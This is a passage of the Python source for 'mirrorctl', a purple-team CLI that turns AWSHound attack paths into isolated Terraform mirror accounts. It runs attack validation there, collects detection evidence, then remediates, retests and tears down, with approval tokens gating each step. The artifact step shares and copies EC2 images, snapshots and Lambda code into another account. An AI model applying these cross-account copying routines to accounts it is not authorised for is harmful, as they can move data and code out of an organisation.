        "cloudtrail_data_events": data_events,
        "guardduty": guardduty,
        "siem": {
            "status": "CONNECTOR_REQUIRED",
            "required_correlation_fields": [
                "eventTime",
                "eventName",
                "userIdentity.arn",
                "sourceIPAddress",
                "awsRegion",
                "requestParameters",
                "responseElements",
            ],
        },
    }


def destroy_mirror(run_dir: Path, profile: str, region: str) -> None:
    terraform_available()
    env = terraform_env(profile, region)
    run_checked(
        ["terraform", "destroy", "-input=false", "-auto-approve"],
        cwd=run_dir,
        env=env,
        timeout=1200,
    )
    artifact_manifest = run_dir / "artifact-manifest.json"
    if artifact_manifest.is_file():
        document = json.loads(artifact_manifest.read_text(encoding="utf-8"))
        for item in document.get("results", []):
            if item.get("type") == "EC2_AMI" and item.get("target_image_id"):
                cleanup_source_image(
                    profile,
                    region,
                    str(item["target_image_id"]),
                    [str(value) for value in item.get("target_snapshots", [])],
                )


def load_source_subgraph(run_dir: Path) -> tuple[dict[str, Node], list[Edge]]:
    path = run_dir / "source-subgraph.json"
    if not path.is_file():
        raise PipelineError(f"source subgraph is missing: {path}")
    document = json.loads(path.read_text(encoding="utf-8"))
    nodes = {
        item["id"]: Node(
            id=item["id"],
            kinds=tuple(item.get("kinds", [])),
            properties=dict(item.get("properties", {})),
        )
        for item in document.get("nodes", [])
    }
    edges = [
        Edge(
            kind=item["kind"],
            start=item["start"],
            end=item["end"],
            properties=dict(item.get("properties", {})),
        )
        for item in document.get("edges", [])
    ]
    return nodes, edges


def download_url(url: str, destination: Path) -> None:
    destination.parent.mkdir(parents=True, exist_ok=True)
    request = urllib.request.Request(url, headers={"User-Agent": f"mirrorctl/{VERSION}"})
    with urllib.request.urlopen(request, timeout=120) as response, destination.open("wb") as output:
        shutil.copyfileobj(response, output)


def cleanup_source_image(
    profile: str, region: str, image_id: str, snapshot_ids: list[str]
) -> None:
    if not snapshot_ids:
        code, described = aws_with_profile(
            ["ec2", "describe-images", "--image-ids", image_id],
            profile,
            region,
            allow_failure=True,
        )
        if code == 0 and described.get("Images"):
            snapshot_ids.extend(
                item.get("Ebs", {}).get("SnapshotId")
                for item in described["Images"][0].get("BlockDeviceMappings", [])
                if item.get("Ebs", {}).get("SnapshotId")
            )
    aws_with_profile(
        ["ec2", "deregister-image", "--image-id", image_id],
        profile,
        region,
        allow_failure=True,
    )
    for snapshot_id in snapshot_ids:
        aws_with_profile(
            ["ec2", "delete-snapshot", "--snapshot-id", snapshot_id],
            profile,
            region,
            allow_failure=True,
        )


def copy_ec2_artifact(
    *,
    node: Node,
    source_profile: str,
    target_profile: str,
    target_account_id: str,
    region: str,
    run_prefix: str,
) -> dict[str, Any]:
    instance_id = str(node.properties.get("instance_id") or (node.arn or "").rsplit("/", 1)[-1])
    image_name = re.sub(r"[^A-Za-z0-9()\[\]./_-]+", "-", f"mirrorctl-{run_prefix}-{instance_id}")[:128]
    tag_specifications = json.dumps(
        [
            {
                "ResourceType": "image",
                "Tags": [
                    {"Key": "ManagedBy", "Value": "awshound-mirror"},
                    {"Key": "RunId", "Value": run_prefix},
                ],
            },
            {
                "ResourceType": "snapshot",
                "Tags": [
                    {"Key": "ManagedBy", "Value": "awshound-mirror"},
                    {"Key": "RunId", "Value": run_prefix},
                ],
            },
        ]
    )
    _, created = aws_with_profile(
        [
            "ec2",
            "create-image",
            "--instance-id",
            instance_id,
            "--name",
            image_name,
            "--description",
            "Temporary mirrorctl artifact; crash-consistent no-reboot image",
            "--no-reboot",
            "--tag-specifications",
            tag_specifications,
        ],
        source_profile,
        region,
    )
    source_image_id = created["ImageId"]
    snapshot_ids: list[str] = []
    target_image_id: str | None = None
    try:
        wait = run_command(
            [
                "aws",
                "ec2",
                "wait",
                "image-available",
                "--image-ids",
                source_image_id,
                "--profile",
                source_profile,
                "--region",
                region,
                "--no-cli-pager",
            ],
            timeout=1800,
        )
        if wait.returncode != 0:
            raise PipelineError(wait.stderr.strip() or "source AMI did not become available")
        _, described = aws_with_profile(
            ["ec2", "describe-images", "--image-ids", source_image_id],
            source_profile,
            region,
        )
        image = described["Images"][0]
        mappings = [item.get("Ebs", {}) for item in image.get("BlockDeviceMappings", [])]
        snapshot_ids = [item["SnapshotId"] for item in mappings if item.get("SnapshotId")]
        if any(item.get("Encrypted") for item in mappings):
            raise PipelineError(
                "temporary AMI is encrypted; an approved customer-managed KMS key sharing/copy workflow is required"
            )
        permission = json.dumps({"Add": [{"UserId": target_account_id}]})
        aws_with_profile(
            [
                "ec2",
                "modify-image-attribute",
                "--image-id",
                source_image_id,
                "--launch-permission",
                permission,
            ],
            source_profile,
            region,
        )
        for snapshot_id in snapshot_ids:
            aws_with_profile(
                [
                    "ec2",
                    "modify-snapshot-attribute",
                    "--snapshot-id",
                    snapshot_id,
                    "--attribute",
                    "createVolumePermission",
                    "--operation-type",
                    "add",
                    "--user-ids",
                    target_account_id,
                ],
                source_profile,
                region,
            )
        _, copied = aws_with_profile(
            [
                "ec2",
                "copy-image",
                "--source-region",
                region,
                "--source-image-id",
                source_image_id,
                "--name",
                image_name,
                "--description",
                "Target-account copy created by mirrorctl",
                "--copy-image-tags",
            ],
            target_profile,
            region,
        )
        target_image_id = copied["ImageId"]
        target_wait = run_command(
            [
                "aws",
                "ec2",
                "wait",
                "image-available",
                "--image-ids",
                target_image_id,
                "--profile",
                target_profile,
                "--region",
                region,
                "--no-cli-pager",
            ],
            timeout=1800,
        )
        if target_wait.returncode != 0:
            raise PipelineError(target_wait.stderr.strip() or "target AMI copy did not become available")
        _, target_described = aws_with_profile(
            ["ec2", "describe-images", "--image-ids", target_image_id],
            target_profile,
            region,
        )
        target_snapshot_ids = [
            item.get("Ebs", {}).get("SnapshotId")
            for item in target_described.get("Images", [{}])[0].get("BlockDeviceMappings", [])
            if item.get("Ebs", {}).get("SnapshotId")
        ]
        return {
            "status": "COPIED",
            "instance_id": instance_id,
            "source_temporary_image_id": source_image_id,
            "target_image_id": target_image_id,
            "target_snapshots": target_snapshot_ids,
            "source_snapshots": snapshot_ids,
            "consistency": "CRASH_CONSISTENT_NO_REBOOT",
        }
    finally:
        # Once the target copy is available, or when copying fails, remove only
        # the temporary source artifacts created by this function.
        cleanup_source_image(source_profile, region, source_image_id, snapshot_ids)


def collect_approved_artifacts(
    *,
    run_dir: Path,
    source_profile: str,
    target_profile: str,
    expected_target_account_id: str,
    include_ec2_snapshots: bool,
) -> dict[str, Any]:
    manifest = load_manifest(run_dir)
    scenario = manifest["scenario"]
    region = scenario["region"]
    source_identity = aws_identity(source_profile, region)
    if str(source_identity.get("Account")) != str(scenario.get("source_account_id")):
        raise PipelineError(
            f"source profile account mismatch: graph={scenario.get('source_account_id')}, profile={source_identity.get('Account')}"
        )
    target_identity = aws_identity(target_profile, region)
    if str(target_identity.get("Account")) != expected_target_account_id:
        raise PipelineError(
            f"target profile account mismatch: expected={expected_target_account_id}, profile={target_identity.get('Account')}"
        )
    if source_identity["Account"] == target_identity["Account"]:
        raise PipelineError("artifact source and target accounts must be different")
    nodes, _ = load_source_subgraph(run_dir)
    artifact_root = run_dir / "artifacts"
    artifact_root.mkdir(parents=True, exist_ok=True)
    results: list[dict[str, Any]] = []
    tfvars: dict[str, dict[str, str]] = {
        "lambda_package_files": {},
        "ec2_ami_overrides": {},
    }
    for node in nodes.values():
        address = tf_address(node)
        if node.primary_kind == "AWS_LambdaFunction":
            code, response = aws_with_profile(
                ["lambda", "get-function", "--function-name", node.arn or node_name(node)],
                source_profile,
                region,
                allow_failure=True,
            )
            if code != 0:
                results.append({"node_id": node.id, "type": "LAMBDA", "status": "UNAVAILABLE", "error": response})
                continue
            location = response.get("Code", {}).get("Location")
            image_uri = response.get("Code", {}).get("ResolvedImageUri") or response.get("Code", {}).get("ImageUri")
            if location:
                destination = (artifact_root / f"{address}.zip").resolve()
                download_url(location, destination)
                tfvars["lambda_package_files"][address] = str(destination)
                results.append({"node_id": node.id, "type": "LAMBDA_ZIP", "status": "COPIED", "path": str(destination), "sha256": sha256_bytes(destination.read_bytes())})
            elif image_uri:
                results.append({"node_id": node.id, "type": "LAMBDA_CONTAINER", "status": "CONTAINER_COPY_REQUIRED", "image_uri": image_uri})
            else:
                results.append({"node_id": node.id, "type": "LAMBDA", "status": "UNAVAILABLE", "error": response.get("Code", {}).get("Error")})
        elif node.primary_kind == "AWS_CloudFormationStack":
            code, response = aws_with_profile(
                ["cloudformation", "get-template", "--stack-name", node.arn or node_name(node), "--template-stage", "Original"],
                source_profile,
                region,
                allow_failure=True,
            )
            if code == 0:
                destination = artifact_root / f"{address}.template"
                destination.write_text(str(response.get("TemplateBody", "")), encoding="utf-8")
                results.append({"node_id": node.id, "type": "CLOUDFORMATION_TEMPLATE", "status": "COLLECTED_REVIEW_REQUIRED", "path": str(destination), "sha256": sha256_bytes(destination.read_bytes())})
            else:
                results.append({"node_id": node.id, "type": "CLOUDFORMATION_TEMPLATE", "status": "UNAVAILABLE", "error": response})
        elif node.primary_kind == "AWS_EC2Instance":
            if not include_ec2_snapshots:
                results.append({"node_id": node.id, "type": "EC2_AMI", "status": "SNAPSHOT_APPROVAL_REQUIRED"})
                continue
            copied = copy_ec2_artifact(
                node=node,
                source_profile=source_profile,
                target_profile=target_profile,
                target_account_id=expected_target_account_id,
                region=region,
                run_prefix=scenario["scenario_id"],
            )
            tfvars["ec2_ami_overrides"][address] = copied["target_image_id"]
            results.append({"node_id": node.id, "type": "EC2_AMI", **copied})
    tfvars = {key: value for key, value in tfvars.items() if value}
    if scenario["scenario_type"] == "generic_awshound_path" and tfvars:
        write_json(run_dir / "artifact.auto.tfvars.json", tfvars)
    result = {
        "collected_at": utc_now(),
        "source_account_id": source_identity["Account"],
        "target_account_id": target_identity["Account"],
        "include_ec2_snapshots": include_ec2_snapshots,
        "results": results,
        "terraform_values_written": tfvars if scenario["scenario_type"] == "generic_awshound_path" else {},
    }
    write_json(run_dir / "artifact-manifest.json", result)
    return result


def ensure_empty_or_force(destination: Path, force: bool) -> None:
    if not destination.exists():
        destination.mkdir(parents=True, exist_ok=True)
        return
    if any(destination.iterdir()):
        if not force:
            raise PipelineError(
                f"output directory is not empty: {destination} (use --force to replace generated scenario directories)"
            )
        resolved = destination.resolve()
        if resolved == Path(resolved.anchor):
            raise PipelineError("refusing to replace a filesystem root")
        # Remove only known generated scenario directories and top-level reports.
        for child in destination.iterdir():
            if child.is_dir() and (child / "run-manifest.json").is_file():
                shutil.rmtree(child)
            elif (
                child.name in {"analysis.json", "pipeline-summary.json", "index.json"}
                or re.fullmatch(r"path-\d{3}\.(?:json|zip)", child.name)
            ) and child.is_file():
                child.unlink()
            else:
                raise PipelineError(
                    f"refusing --force because output contains an unknown item: {child}"
                )
    destination.mkdir(parents=True, exist_ok=True)


def analyze_document(input_path: Path) -> tuple[
    dict[str, Any], bytes, dict[str, Node], list[Edge], list[Scenario]
]:
    document, raw = load_graph(input_path)
    nodes, edges = normalize_graph(document)
    scenarios = detect_scenarios(nodes, edges)
    return document, raw, nodes, edges, scenarios


def cmd_analyze(args: argparse.Namespace) -> None:
    _, raw, nodes, edges, scenarios = analyze_document(args.input)
    catalog = official_edge_catalog()
    report = {
        "tool": "mirrorctl",
        "tool_version": VERSION,
        "analyzed_at": utc_now(),
        "source": source_summary(nodes, edges, raw),
        "scenarios": [asdict(scenario) for scenario in scenarios],
        "unsupported": {
            "node_kinds": sorted(
                {node.primary_kind for node in nodes.values() if node.primary_kind not in NODE_LAYERS}
            ),
            "edge_kinds": sorted(
                {edge.kind for edge in edges if edge.kind not in catalog}
            ),
        },
        "registry_coverage": {
            "official_node_kinds": 20,
            "official_relationship_kinds": len(catalog),
            "structural_relationship_kinds": sum(1 for item in catalog.values() if item["structural"]),
            "action_mapped_relationship_kinds": sum(1 for item in catalog.values() if not item["structural"] and item["actions"]),
        },
    }
    if args.output:
        write_json(args.output, report)
        print(f"Analysis written to {args.output}")
    else:
        print(json.dumps(report, indent=2, ensure_ascii=False))


def cmd_extract(args: argparse.Namespace) -> None:
    _, raw, nodes, edges, _ = analyze_document(args.input)
    paths = extract_attack_paths(
        nodes,
        edges,
        source_selectors=args.source,
        target_selectors=args.target,
        max_depth=args.max_depth,
        limit=args.limit,
    )
    if not paths:
        raise PipelineError("no traversable source-to-target attack path was found")
    result = write_extracted_paths(
        args.output,
        paths,
        nodes,
        sha256_bytes(raw),
        args.force,
    )
    print(f"Extracted {result['path_count']} attack path(s) to {args.output}")
    for item in result["paths"]:
        print(
            f"  - {item['path_id']}: {item['source_name']} -> "
            f"{item['target_name']} (depth={item['depth']}, score={item['score']})"
        )


def cmd_prepare(args: argparse.Namespace) -> None:
    _, raw, nodes, edges, scenarios = analyze_document(args.input)
    if args.scenario:
        wanted = set(args.scenario)
        scenarios = [scenario for scenario in scenarios if scenario.scenario_id in wanted]
        missing = wanted - {scenario.scenario_id for scenario in scenarios}
        if missing:
            raise PipelineError("requested scenario was not detected: " + ", ".join(sorted(missing)))
    if not scenarios:
        raise PipelineError("no supported attack-path scenario was detected")
    ensure_empty_or_force(args.output, args.force)
    summary = {
        "tool": "mirrorctl",
        "tool_version": VERSION,
        "prepared_at": utc_now(),
        "source_file": str(args.input),
        "source": source_summary(nodes, edges, raw),
        "scenario_directories": [],
    }
    for scenario in scenarios:
        requests = context_plan(scenario, nodes, edges)
        collected = (
            collect_context(requests, args.source_profile, scenario.source_account_id)
            if args.source_profile
            else None
        )
        destination = generate_scenario_directory(
            args.output,
            scenario,
            nodes,
            edges,
            requests,
            sha256_bytes(raw),
            collected,
        )
        if collected is not None:
            write_json(destination / "context-evidence.json", collected)
        summary["scenario_directories"].append(
            {
                "scenario_id": scenario.scenario_id,
                "scenario_type": scenario.scenario_type,
                "path": str(destination),
                "context_collected": bool(args.source_profile),
            }
        )
    write_json(args.output / "pipeline-summary.json", summary)
    print(f"Prepared {len(scenarios)} scenario(s) in {args.output}")
    for item in summary["scenario_directories"]:
        print(f"  - {item['scenario_id']}: {item['path']}")
    print("No Terraform or attack command was executed.")


def require_deployed(run_dir: Path) -> None:
    state = load_state(run_dir)
    if state.get("deployment", {}).get("status") != "DEPLOYED":
        raise PipelineError("mirror is not recorded as DEPLOYED")


def operational_context(args: argparse.Namespace) -> tuple[dict[str, Any], str]:
    run_dir = args.run_dir.resolve()
    manifest = load_manifest(run_dir)
    verify_target(
        run_dir,
        args.target_profile,
        args.expected_account_id,
        args.allow_source_account,
    )
    return manifest, manifest["scenario"]["region"]


def cmd_deploy(args: argparse.Namespace) -> None:
    approval(args.approve, "APPLY")
    deploy_mirror(
        args.run_dir.resolve(),
        args.target_profile,
        args.expected_account_id,
        args.allow_source_account,
    )
    print("Mirror deployed. Attack execution has not started.")


def cmd_attack(args: argparse.Namespace) -> None:
    approval(args.approve, "ATTACK")
    run_dir = args.run_dir.resolve()
    operational_context(args)
    require_deployed(run_dir)
    contract_path = run_dir / "validation-contract.json"
    if contract_path.is_file():
        contract = json.loads(contract_path.read_text(encoding="utf-8"))
        if contract.get("automation_status") != "AUTO_EXECUTABLE":
            details = {
                "missing_automation": contract.get("missing_automation", []),
                "validation_contract": str(contract_path),
            }
            append_history(
                run_dir,
                "attack",
                "EXECUTOR_IMPLEMENTATION_REQUIRED",
                details,
            )
            raise PipelineError(
                "attack execution is not implemented for this path; see validation-contract.json"
            )
    try:
        result = execute_attack(run_dir, args.target_profile, expect_blocked=False)
        write_json(run_dir / ".mirrorctl" / "attack-result.json", result)
        append_history(run_dir, "attack", result["status"], result)
    except PipelineError as exc:
        status = "BLOCKED" if is_authorization_denial(str(exc)) else "ERROR"
        details = {"started_at": utc_now(), "completed_at": utc_now(), "error": str(exc)[-2000:]}
        append_history(run_dir, "attack", status, details)
        raise
    print(f"Attack validation: {result['status']}")


def cmd_evidence(args: argparse.Namespace) -> None:
    run_dir = args.run_dir.resolve()
    _, region = operational_context(args)
    require_deployed(run_dir)
    result = collect_detection_evidence(run_dir, args.target_profile, region)
    destination = run_dir / ".mirrorctl" / "detection-evidence.json"
    write_json(destination, result)
    append_history(run_dir, "evidence", result["overall"], {"evidence_file": str(destination)})
    print(f"Detection validation: {result['overall']}")
    print(f"Evidence written to {destination}")


def cmd_remediate(args: argparse.Namespace) -> None:
    approval(args.approve, "FIX")
    run_dir = args.run_dir.resolve()
    _, region = operational_context(args)
    require_deployed(run_dir)
    remediate_mirror(run_dir, args.target_profile, region)
    append_history(
        run_dir,
        "remediation",
        "APPLIED",
        {"control": "enable_vulnerable_path=false", "completed_at": utc_now()},
    )
    print("Remediation applied. Run retest to prove the path is blocked.")


def cmd_retest(args: argparse.Namespace) -> None:
    approval(args.approve, "RETEST")
    run_dir = args.run_dir.resolve()
    operational_context(args)
    require_deployed(run_dir)
    state = load_state(run_dir)
    if state.get("remediation", {}).get("status") != "APPLIED":
        raise PipelineError("remediation is not recorded as APPLIED")
    # IAM and resource-policy changes are eventually consistent.
    time.sleep(10)
    result = execute_attack(run_dir, args.target_profile, expect_blocked=True)
    write_json(run_dir / ".mirrorctl" / "retest-result.json", result)
    append_history(run_dir, "retest", result["status"], result)
    print(f"Retest: {result['status']}")


def cmd_destroy(args: argparse.Namespace) -> None:
    approval(args.approve, "DESTROY")
    run_dir = args.run_dir.resolve()
    _, region = operational_context(args)
    destroy_mirror(run_dir, args.target_profile, region)
    append_history(run_dir, "destroy", "DESTROYED", {"completed_at": utc_now()})
    print("Mirror resources destroyed. Local evidence and Terraform state were retained.")


def cmd_artifacts(args: argparse.Namespace) -> None:
    approval(args.approve, "ARTIFACTS")
    run_dir = args.run_dir.resolve()
    result = collect_approved_artifacts(
        run_dir=run_dir,
        source_profile=args.source_profile,
        target_profile=args.target_profile,
        expected_target_account_id=args.expected_target_account_id,
        include_ec2_snapshots=args.include_ec2_snapshots,
    )
    copied = sum(1 for item in result["results"] if item.get("status") in {"COPIED", "COLLECTED_REVIEW_REQUIRED"})
    append_history(
        run_dir,
        "artifacts",
        "COLLECTED" if copied else "NO_ARTIFACT_COPIED",
        {"artifact_manifest": str(run_dir / "artifact-manifest.json"), "copied": copied},
    )
    print(f"Artifact collection completed: {copied} copied/collected")
    print(f"Manifest: {run_dir / 'artifact-manifest.json'}")


def add_operational_arguments(parser: argparse.ArgumentParser, approval_token: str | None) -> None:
    parser.add_argument("--run-dir", required=True, type=Path, help="generated scenario directory")
    parser.add_argument("--target-profile", required=True, help="AWS CLI profile for the mirror account")
    parser.add_argument("--expected-account-id", required=True, help="exact 12-digit mirror account ID")
    parser.add_argument(
        "--allow-source-account",
        action="store_true",
        help="allow the graph source account only when it is an explicitly authorized disposable lab",
    )
    if approval_token:
        parser.add_argument(
            "--approve",
            required=True,
            help=f"exact confirmation token: {approval_token}",
        )


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Analyze AWSHound paths and orchestrate isolated minimal mirrors."
    )
    parser.add_argument("--version", action="version", version=f"mirrorctl {VERSION}")
    subparsers = parser.add_subparsers(dest="command", required=True)

    analyze = subparsers.add_parser("analyze", help="classify paths and layers; no AWS access")
    analyze.add_argument("--input", required=True, type=Path, help="AWSHound graph ZIP or graph.json")
    analyze.add_argument("--output", type=Path, help="optional analysis JSON path")
    analyze.set_defaults(func=cmd_analyze)

    extract = subparsers.add_parser(
        "extract",
        help="extract ranked traversable source-to-target paths from a full AWSHound graph",
    )
    extract.add_argument("--input", required=True, type=Path, help="full AWSHound graph ZIP or graph.json")
    extract.add_argument("--output", required=True, type=Path, help="directory for path JSON/ZIP files")
    extract.add_argument(
        "--source",
        action="append",
        help="source node ID, ARN, name, or substring; repeatable; defaults to starting-tagged principals",
    )
    extract.add_argument(
        "--target",
        action="append",
        help="target node ID, ARN, name, or substring; repeatable; defaults to admin/data targets",
    )
    extract.add_argument("--max-depth", type=int, default=6, help="maximum traversable edges per path (1-12)")
    extract.add_argument("--limit", type=int, default=20, help="maximum ranked paths to export (1-500)")
    extract.add_argument("--force", action="store_true", help="replace only recognized extracted-path files")
    extract.set_defaults(func=cmd_extract)

    prepare = subparsers.add_parser(
        "prepare",
        help="create context plans, minimal specs and Terraform; optionally collect read-only context",
    )
    prepare.add_argument("--input", required=True, type=Path, help="AWSHound graph ZIP or graph.json")
    prepare.add_argument("--output", required=True, type=Path, help="generated pipeline directory")
    prepare.add_argument(
        "--scenario",
        action="append",
        help="scenario ID to prepare; repeat to select multiple; default is all detected scenarios",
    )
    prepare.add_argument(
        "--source-profile",
        help="optional source profile for allow-listed read-only context collection",
    )
    prepare.add_argument("--force", action="store_true", help="replace only recognized generated output")
    prepare.set_defaults(func=cmd_prepare)

    deploy = subparsers.add_parser("deploy", help="terraform plan and apply in a verified target account")
    add_operational_arguments(deploy, "APPLY")
    deploy.set_defaults(func=cmd_deploy)

    attack = subparsers.add_parser("attack", help="execute the bounded scenario adapter")
    add_operational_arguments(attack, "ATTACK")
    attack.set_defaults(func=cmd_attack)

    evidence = subparsers.add_parser("evidence", help="collect read-only CloudTrail and GuardDuty evidence")
    add_operational_arguments(evidence, None)
    evidence.set_defaults(func=cmd_evidence)

    remediate = subparsers.add_parser("remediate", help="remove the vulnerable edge with Terraform")
    add_operational_arguments(remediate, "FIX")
    remediate.set_defaults(func=cmd_remediate)

    retest = subparsers.add_parser("retest", help="repeat the first attack action and require denial")
    add_operational_arguments(retest, "RETEST")
    retest.set_defaults(func=cmd_retest)

    destroy = subparsers.add_parser("destroy", help="destroy Terraform-managed mirror resources")
    add_operational_arguments(destroy, "DESTROY")
    destroy.set_defaults(func=cmd_destroy)

    artifacts = subparsers.add_parser(
        "artifacts",
        help="collect approved Lambda/CloudFormation artifacts and optionally copy an EC2 AMI snapshot",
    )
    artifacts.add_argument("--run-dir", required=True, type=Path, help="generated scenario directory")
    artifacts.add_argument("--source-profile", required=True, help="AWS CLI profile for the graph source account")
    artifacts.add_argument("--target-profile", required=True, help="AWS CLI profile for the isolated target account")
    artifacts.add_argument("--expected-target-account-id", required=True, help="exact 12-digit target account ID")
    artifacts.add_argument(
        "--include-ec2-snapshots",
        action="store_true",
        help="create a temporary no-reboot source AMI, copy it to target, then delete only the temporary source artifacts",
    )
    artifacts.add_argument("--approve", required=True, help="exact confirmation token: ARTIFACTS")
    artifacts.set_defaults(func=cmd_artifacts)
    return parser


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    try:
        args.func(args)
    except (PipelineError, OSError, json.JSONDecodeError, subprocess.TimeoutExpired) as exc:
        print(f"mirrorctl: error: {exc}", file=sys.stderr)
        return 2
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
